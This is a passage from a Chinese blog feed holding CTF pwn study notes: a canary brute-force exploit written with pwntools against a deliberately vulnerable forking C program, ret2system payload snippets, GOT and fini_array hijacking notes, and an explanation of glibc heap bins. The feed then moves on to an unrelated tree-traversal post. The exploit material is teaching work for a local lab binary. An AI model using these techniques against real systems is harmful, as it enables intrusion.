fork 函数会直接拷贝父进程的内存。<br>爆破次数：对于32位ELF，低字节固定是\x00，所以只需要对三个字节进行爆破。爆破方式是先利用栈溢出覆写次低字节，如果出错的话，会报错，获得正确的次低字节的话，不会报错。获取正确的次低字节之后，再依次爆破次高字节和高字节。每个字节的可能性是256，因此3个字节的逐个爆破总次数是256+256+256&#x3D;768次方法五 </p><h4 id="e-g-1"><a href="#e-g-1" class="headerlink" title="e.g."></a>e.g.</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test2.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getshell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello Hacker!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (fork()) <span class="comment">//father</span></span><br><span class="line">        &#123;</span><br><span class="line">            wait(<span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//child</span></span><br><span class="line">        &#123;</span><br><span class="line">            vuln();</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./test2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x80491e6</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello Hacker!\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 逐字节爆破</span></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment"># 如果是64位的就要遍历7字节</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xc</span>) + canary + p8(j)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        res = p.recv()</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">b&quot;stack smashing detected&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;the <span class="subst">&#123;i&#125;</span> is <span class="subst">&#123;<span class="built_in">hex</span>(j)&#125;</span>&#x27;</span>)</span><br><span class="line">            canary += p8(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">len</span>(canary) == i + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Canary: <span class="subst">&#123;<span class="built_in">hex</span>(u32(canary))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xc</span>) + canary + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(system_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="劫持-stack-chk-fail函数"><a href="#劫持-stack-chk-fail函数" class="headerlink" title="劫持__stack_chk_fail函数"></a>劫持__stack_chk_fail函数</h3><h4 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h4><p>在开启canary保护的程序中，如果canary不对，程序会转到<strong>stack_chk_fail函数执行</strong>。stack_chk_fail函数是一个普通的延迟绑定函数，可以通过修改GOT表劫持这个函数。</p><h2 id="pwn-random伪随机数篇"><a href="#pwn-random伪随机数篇" class="headerlink" title="pwn random伪随机数篇"></a>pwn random伪随机数篇</h2><h3 id="glibc"><a href="#glibc" class="headerlink" title="glibc"></a>glibc</h3><p>glibc的意思是GNU libc，是GNU旗下的C标准库，后来被liunx运用了，因此在liunx中自带的libc就是glibc，这个libc和windows上的是不同的。</p><h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><p>要想使用random，首先要种下一颗“种子”，需要利用函数srand，意思是seed rand，不同的种子，得出来的random<a href="https://so.csdn.net/so/search?q=%E9%9A%8F%E6%9C%BA%E6%95%B0&spm=1001.2101.3001.7020">随机数</a>的序列会不一样，我这里用1作为种子，得出来的序列如下图：</p><p><img src="/2024/03/15/CTF/image-20240424154727436.png" alt="image-20240424154727436"></p><p><img src="/2024/03/15/CTF/image-20240424154742639.png" alt="image-20240424154742639"></p><p>如果你也是用1作为种子，那么得出来的序列和我这个会是一样的，这就是伪随机。<br>通常情况下，会采用“当前时间”作为种子</p><p><img src="/2024/03/15/CTF/image-20240424154851884.png" alt="image-20240424154851884"></p><p><img src="/2024/03/15/CTF/image-20240424154910678.png" alt="image-20240424154910678"></p><h2 id="【PWN-·-总结】"><a href="#【PWN-·-总结】" class="headerlink" title="【PWN · 总结】"></a>【PWN · 总结】</h2><h3 id="call-system与system调用"><a href="#call-system与system调用" class="headerlink" title="call _system与system调用"></a>call _system与system调用</h3><p><a href="https://blog.csdn.net/Mr_Fmnwon/article/details/132006814">【PWN · 总结】call _system与system调用_call system-CSDN博客</a></p><p>构造payload的时候有两种方式构造<br>第一种，溢出后的返回地址是system的地址，也就是plt表中system的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system_addr = <span class="number">0x08048320</span></span><br><span class="line">binsh_addr = <span class="number">0x0804a024</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(<span class="number">0</span>)  + p32(binsh_addr)</span><br></pre></td></tr></table></figure><p>第二种，溢出后的返回地址是call system的地址，这是程序中出现过的调用system的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system_addr = <span class="number">0x08048320</span></span><br><span class="line">binsh_addr = <span class="number">0x0804a024</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(binsh_addr)</span><br></pre></td></tr></table></figure><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>左侧找到相关函数，双击。 </p><p><img src="/2024/03/15/CTF/a12c305121ac49cfa4f95f03e1be1c06.png" alt="img"></p><p><img src="/2024/03/15/CTF/77b208c54b3a4f719cf1ce4b6b1f1a59.png" alt="img"></p><p>选中一行 <em><strong>*_system*</strong></em> 按x键，即交叉引用，找到程序中用到_system的其他位置</p><p><img src="/2024/03/15/CTF/f887c6d0071a4ff29d71217871f41026.png" alt="img"></p><p><img src="/2024/03/15/CTF/2ae6877506e742b5bdcb4ca14ad1c5b1.png" alt="img"></p><p>即可找到相关代码段</p><h2 id="重写fini-array"><a href="#重写fini-array" class="headerlink" title="重写fini_array"></a>重写fini_array</h2><ul><li>当<code>RELRO</code>保护为<code>NO RELRO</code>的时候，<code>init.array、fini.array、got.plt</code>均可读可写；为<code>PARTIAL RELRO</code>的时候，<code>ini.array、fini.array</code>可读不可写，<code>got.plt</code>可读可写；为<code>FULL RELRO</code>时，<code>init.array、fini.array、got.plt</code>均可读不可写。</li><li>程序在加载的时候，会依次调用<code>init.array</code>数组中的每一个函数指针，在结束的时候，依次调用<code>fini.array</code>中的每一个函数指针</li><li>当程序出现格式化字符串漏洞，但是需要写两次才能完成攻击，这个时候可以考虑改写<code>fini.array</code>中的函数指针为<code>main</code>函数地址，可以再执行一次<code>main</code>函数。一般来说，这个数组的长度为<code>1</code>，也就是说只能写一个地址。</li></ul><h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ol><li><code>Top chunk</code>:当程序第一次进行malloc时， heap被分为2块， 一块给用户，剩下的那块是top chunk， 再次申请堆块时要是没有合适的空间便回使用top chunk的空间</li><li>申请到的一块内存的起始地址≠你可以写入数据的起始地址，因为堆块头部会记录一些信息，一般有0x10大小的差距</li><li>申请的大小≠实际申请的大小，它会有一个取整的步骤</li></ol><h3 id="内存分配函数"><a href="#内存分配函数" class="headerlink" title="内存分配函数"></a>内存分配函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 分配一块指定大小的内存空间,不会把内存清零</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="comment">// 释放 address 所指向的内存块,但不会清理区块的内容</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *pointer)</span>;</span><br><span class="line"><span class="comment">// 分配 num 个长度为 size 的连续空间，将分配的区块全部清零</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> num, <span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="comment">// 重新分配内存，把内存扩展到 newsize</span></span><br><span class="line"><span class="comment">// 扩大：高位空闲直接扩大，否则在最后重新分配一块并把内容复制进来</span></span><br><span class="line"><span class="comment">// 缩小：如果不是最高位相当于free一块，如果是最高位释放的块合并到top chunk中</span></span><br><span class="line"><span class="comment">// 传入的address为空，相当于malloc函数，传入的newsize为0相当于free函数</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">realloc</span><span class="params">(<span class="type">void</span> *address, <span class="type">size_t</span> newsize)</span>;</span><br></pre></td></tr></table></figure><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"><span class="comment">// INTERNAL_SIZE_T即size_t,在32位系统上是32位无符号整数(4bytes)，在64位系统上是64位无符号整数(8bytes)</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  </span><br><span class="line">  INTERNAL_SIZE_T      size;       </span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>对chunk结构的解释</strong></p><ul><li><p><code>struct malloc_chunk*</code>是定义指针，定义的变量大小在32位系统占4个字节，在64位占8个字节。</p></li><li><p><code>prev_size</code>:前一个chunk空闲则记录了前一个chunk的大小，如果前一个chunk不空闲，那么这里存储的就是前一个chunk最后的数据.</p></li><li><p><code>size</code>:当前chunk的大小,并记录了当前chunk和前一个chunk的一些属性，二进制的后3位,chunk的大小必须是2*SIZE_SZ的整数倍，如果不满足会被强制转换为2 * SIZE_SZ的整数倍。</p><p><strong>size标志位</strong></p><ul><li><code>NON_MAIN_ARENA</code>:记录当前chunk是否不属于主线程，1代表不属于，0代表属于</li><li><code>IS_MAPPED</code>:记录当前chunk是否由mmap分配</li><li><code>PREV_INUSE</code>:记录前一个chunk块是否被分配，1代表被分配，0代表没有被分配。当一个 chunk 的 size 的 P 位为 0 时，说明前一个chunk空闲，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li><p><code>fd</code>:记录了下一个被free的chunk</p></li><li><p><code>bk</code>:记录了上一个被free的chunk</p></li><li><p><code>fd_nextsize</code>:指向前一个与当前chunk大小不同的第一个空闲块，不包含 bin 的头指针。</p></li><li><p><code>bk_nextsize</code> 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p></li></ul><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>ptmalloc把空闲的堆分成四种，分别是fast bins，small bins，large bins，unsorted bin<br>相似大小的 chunk 会用双向链表链接起来。也就是说，在每类 bin 的内部仍然会有多个互不相关的链表来保存不同大小的 chunk。<br>对于 small bins，large bins，unsorted bin 来说，ptmalloc 将它们维护在同一个数组中。这些 bin 对应的数据结构在 malloc_state 中，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS 128</span></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br></pre></td></tr></table></figure><p><img src="/2024/03/15/CTF/aHR0cHM6Ly9pbWFnZS4zMDAxLm5ldC9pbWFnZXMvMjAxNjA1MjUvMTQ2NDE0NTkxNjYxMDEucG5nIXNtYWxs" alt="结构图"><img src="/2024/03/15/CTF/20200112091744996.png" alt="image"></p><p>按顺序依次是:</p><ol><li>索引为1处是unsorted bin，存储的chunk没有排序</li><li>索引从2到63的bin称为small bin,同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 2 个机器字长，即 32 位相差 8 字节，64 位相差 16 字节。</li><li>small bins 后面的 bin 被称作 large bins，索引为64到126。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的 chunk 同样按照最近使用顺序排列。</li><li>fastbins单独记录在一个fastbinsY数组中，个数为10，chunk size为16到80字节的chunk就叫做fast chunk</li></ol><h4 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a>fastbins</h4><p><img src="/2024/03/15/CTF/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTEvZ29HQ04xcUJPaGtQWHRhLnBuZw" alt="image.png"></p><ol><li>使用LIFO(后入先出)算法，添加操作(free内存)就是将新的fast chunk加入链表尾，删除操作(malloc内存)就是将链表尾部的fast chunk删除。</li><li><code>chunk size</code>：10个fast bin中所包含的fast chunk size是按照步进8字节排列的，即第一个fast bin中所有fast chunk size均为16字节，第二个fast bin中为24字节，依次类推。在进行malloc初始化的时候，最大的fast chunk size被设置为80字节(chunk unused size为64字节)，因此默认情况下大小为16到80字节的chunk被分类到fast chunk</li><li>不会对free chunk进行合并操作。鉴于设计fast bin的初衷就是进行快速的小内存分配和释放，因此系统将属于fast bin的chunk的P(未使用标志位)总是设置为1，这样即使当fast bin中有某个chunk同一个free chunk相邻的时候，系统也不会进行自动合并操作，而是保留两者。虽然这样做可能会造成额外的碎片化问题，但瑕不掩瑜。</li><li>malloc(fast chunk)操作：即用户通过malloc请求的大小属于fast chunk的大小范围(注意：用户请求size加上16字节就是实际内存chunk size)。在初始化的时候fast bin支持的最大内存大小以及所有fast bin链表都是空的，所以当最开始使用malloc申请内存的时候，即使申请的内存大小属于fast chunk的内存大小(即16到80字节)，它也不会交由fast bin来处理，而是向下传递交由small bin来处理，如果small bin也为空的话就交给unsorted bin处理</li><li>free(fast chunk)操作：这个操作很简单，主要分为两步：先通过chunksize函数根据传入的地址指针获取该指针对应的chunk的大小；然后根据这个chunk大小获取该chunk所属的fast bin，然后再将此chunk添加到该fast bin的链尾即可。整个操作都是在_int_free函数中完成。</li></ol><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。</p><ol><li>unsorted bin的个数： 1个。unsorted bin是一个由free chunks组成的循环双链表。</li><li>Chunk size: 在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。这就是前言说的特例了，不过特例并非仅仅这一个，后文会介绍。</li></ol><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><ol><li>chunk size:从16到504字节(64位系统的话是从32字节到1008字节)</li><li>free(small chunk)：当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，最后将新的chunk添加到unsorted bin中</li></ol><h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><ol><li>一是同一个large bin中每个chunk的大小可以不一样，但必须处于某个给定的范围(特例2) ；二是large chunk可以添加、删除在large bin的任何一个位置</li><li>在这63个large bins中，前32个large bin依次以64字节步长为间隔，即第一个large bin中chunk size为512~575字节，第二个large bin中chunk size为576 ~ 639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。如下表所示。</li></ol><table><thead><tr><th>组</th><th>数量</th><th>公差</th></tr></thead><tbody><tr><td>1</td><td>32</td><td>64B</td></tr><tr><td>2</td><td>16</td><td>512B</td></tr><tr><td>3</td><td>8</td><td>4096B</td></tr><tr><td>4</td><td>4</td><td>32768B</td></tr><tr><td>5</td><td>2</td><td>262144B</td></tr><tr><td>6</td><td>1</td><td>不限制</td></tr></tbody></table><ol start="3"><li><p>free和合并操作：类似于small bin。</p></li><li><p>malloc操作：初始化完成之前的操作类似于small bin，这里主要讨论large bins初始化完成之后的操作。首先确定用户请求的大小属于哪一个large bin，然后判断该large bin中最大的chunk的size是否大于用户请求的size(只需要对比链表中front end的size即可)。如果大于，就从rear end开始遍历该large bin，找到第一个size相等或接近的chunk，分配给用户。如果该chunk大于用户请求的size的话，就将该chunk拆分为两个chunk：前者返回给用户，且size等同于用户请求的size；剩余的部分做为一个新的chunk添加到unsorted bin中。</p></li><li><p>一是同一个large bin中每个chunk的大小可以不一样，但必须处于某个给定的范围(特例2) ；二是large chunk可以添加、删除在large bin的任何一个位置</p></li><li><p>在这63个large bins中，前32个large bin依次以64字节步长为间隔，即第一个large bin中chunk size为512~575字节，第二个large bin中chunk size为576 ~ 639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。如下表所示。</p><table><thead><tr><th>组</th><th>数量</th><th>公差</th></tr></thead><tbody><tr><td>1</td><td>32</td><td>64B</td></tr><tr><td>2</td><td>16</td><td>512B</td></tr><tr><td>3</td><td>8</td><td>4096B</td></tr><tr><td>4</td><td>4</td><td>32768B</td></tr><tr><td>5</td><td>2</td><td>262144B</td></tr><tr><td>6</td><td>1</td><td>不限制</td></tr></tbody></table></li><li><p>free和合并操作：类似于small bin。</p></li><li><p>malloc操作：初始化完成之前的操作类似于small bin，这里主要讨论large bins初始化完成之后的操作。首先确定用户请求的大小属于哪一个large bin，然后判断该large bin中最大的chunk的size是否大于用户请求的size(只需要对比链表中front end的size即可)。如果大于，就从rear end开始遍历该large bin，找到第一个size相等或接近的chunk，分配给用户。如果该chunk大于用户请求的size的话，就将该chunk拆分为两个chunk：前者返回给用户，且size等同于用户请求的size；剩余的部分做为一个新的chunk添加到unsorted bin中。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;Reverse&quot;&gt;&lt;a href=&quot;#Reverse&quot; class=&quot;headerlink&quot; title=&quot;Reverse&quot;&gt;&lt;/a&gt;Reverse&lt;/h1&gt;&lt;h2 id=&quot;1-IDA基础操作&quot;&gt;&lt;a href=&quot;#1-IDA基础操作&quot; </summary>
      
    
    
    
    <category term="CTF" scheme="https://1xueyu1.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>N叉树的遍历</title>
    <link href="https://1xueyu1.github.io/2024/02/22/N%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/"/>
    <id>https://1xueyu1.github.io/2024/02/22/N%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/</id>
    <published>2024-02-22T08:08:17.000Z</published>
    <updated>2024-02-22T08:43:57.698Z</updated>
    
    <content type="html"><![CDATA[<h1 id="N叉树的遍历"><a href="#N叉树的遍历" class="headerlink" title="N叉树的遍历"></a>N叉树的遍历</h1><p><a href="https://leetcode.cn/problems/n-ary-tree-preorder-traversal/description/?envType=daily-question&envId=2024-02-18">589. N 叉树的前序遍历 - 力扣（LeetCode）</a></p><p>根据我以前的二叉树的前序遍历的迭代写法，发现这道题写不清楚。然后看题解，发现<strong>代码随想录</strong>的前中后序遍历的同一写法写起来简单而且也容易理解。</p><p><a href="https://1xueyu1.github.io/2023/11/20/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/">二叉树的遍历 | Rayii’s blog (1xueyu1.github.io)</a></p><p>下面是二叉树同一迭代法。</p><p><a href="https://www.programmercarl.com/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E7%BB%9F%E4%B8%80%E8%BF%AD%E4%BB%A3%E6%B3%95.html#%E6%80%9D%E8%B7%AF">代码随想录 (programmercarl.com)</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// N叉树前序遍历的迭代写法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorder</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>)<span class="keyword">return</span> ans;</span><br><span class="line">        stack&lt;Node*&gt; st;</span><br><span class="line">        st.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!st.<span class="built_in">empty</span>())<span class="comment">// 出栈时反过来就是从左往右</span></span><br><span class="line">        &#123;</span><br><span class="line">            root = st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            ans.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">// 先处理中</span></span><br><span class="line">            <span class="type">int</span> n = root-&gt;children.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            &#123;</span><br><span class="line">                st.<span class="built_in">push</span>(root-&gt;children[i]);<span class="comment">// 从右往左</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;N叉树的遍历&quot;&gt;&lt;a href=&quot;#N叉树的遍历&quot; class=&quot;headerlink&quot; title=&quot;N叉树的遍历&quot;&gt;&lt;/a&gt;N叉树的遍历&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://leetcode.cn/problems/n-ary-tree-preor</summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="树" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/"/>
    
    
  </entry>
  
  <entry>
    <title>tmux-tutorial</title>
    <link href="https://1xueyu1.github.io/2024/02/19/tmux/"/>
    <id>https://1xueyu1.github.io/2024/02/19/tmux/</id>
    <published>2024-02-19T12:36:09.000Z</published>
    <updated>2024-03-16T13:56:03.243Z</updated>
    
